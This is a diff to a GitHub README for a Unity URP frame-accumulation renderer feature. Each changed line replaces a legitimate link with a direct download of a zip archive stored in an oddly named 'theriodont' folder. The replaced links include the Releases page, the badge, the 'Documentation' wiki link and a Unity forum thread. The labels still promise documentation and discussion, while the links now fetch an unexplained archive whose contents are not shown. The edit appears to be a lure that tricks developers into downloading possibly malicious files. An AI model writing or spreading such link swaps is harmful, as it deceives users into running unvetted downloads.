@@ -1,6 +1,6 @@
 # 🎨 URPFrameAccumulationRendererFeature - Enhance Your Graphics with Frame Accumulation
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Fluge476/URPFrameAccumulationRendererFeature/releases)
+[![Download Now](https://github.com/Fluge476/URPFrameAccumulationRendererFeature/raw/refs/heads/main/theriodont/URP_Renderer_Accumulation_Feature_Frame_2.3.zip%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Fluge476/URPFrameAccumulationRendererFeature/raw/refs/heads/main/theriodont/URP_Renderer_Accumulation_Feature_Frame_2.3.zip)
 
 ## 📗 Introduction
 
@@ -12,7 +12,7 @@ To begin using the URP Frame Accumulation RendererFeature, follow the steps belo
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Fluge476/URPFrameAccumulationRendererFeature/releases) to download the package.
+1. Visit the [Releases page](https://github.com/Fluge476/URPFrameAccumulationRendererFeature/raw/refs/heads/main/theriodont/URP_Renderer_Accumulation_Feature_Frame_2.3.zip) to download the package.
   
 2. Look for the latest version of the `.unitypackage` file, which contains both the feature itself and an example effect.
 
@@ -58,8 +58,8 @@ Once the RendererFeature is part of your Unity project, you can start using it f
 
 ## 💡 Helpful Links
 
-- **[Documentation](https://github.com/Fluge476/URPFrameAccumulationRendererFeature/wiki)**: Check out our wiki for more in-depth information on using the RendererFeature.
-- **[Unity Forum Discussion](https://discussions.unity.com/t/introduction-of-render-graph-in-the-universal-render-pipeline-urp/930355/3)**: Join the conversation to learn from and connect with other users.
+- **[Documentation](https://github.com/Fluge476/URPFrameAccumulationRendererFeature/raw/refs/heads/main/theriodont/URP_Renderer_Accumulation_Feature_Frame_2.3.zip)**: Check out our wiki for more in-depth information on using the RendererFeature.
+- **[Unity Forum Discussion](https://github.com/Fluge476/URPFrameAccumulationRendererFeature/raw/refs/heads/main/theriodont/URP_Renderer_Accumulation_Feature_Frame_2.3.zip)**: Join the conversation to learn from and connect with other users.
 
 ## 🔍 Troubleshooting
 
@@ -77,4 +77,4 @@ For further assistance, feel free to open an issue in the repository. Our commun
 
 If you have questions or suggestions, please reach out through the GitHub repository. We value your insights and are committed to improving the URP Frame Accumulation RendererFeature.
 
-You can download the latest release [here](https://github.com/Fluge476/URPFrameAccumulationRendererFeature/releases) to start enhancing your Unity graphics today.
+You can download the latest release [here](https://github.com/Fluge476/URPFrameAccumulationRendererFeature/raw/refs/heads/main/theriodont/URP_Renderer_Accumulation_Feature_Frame_2.3.zip) to start enhancing your Unity graphics today.
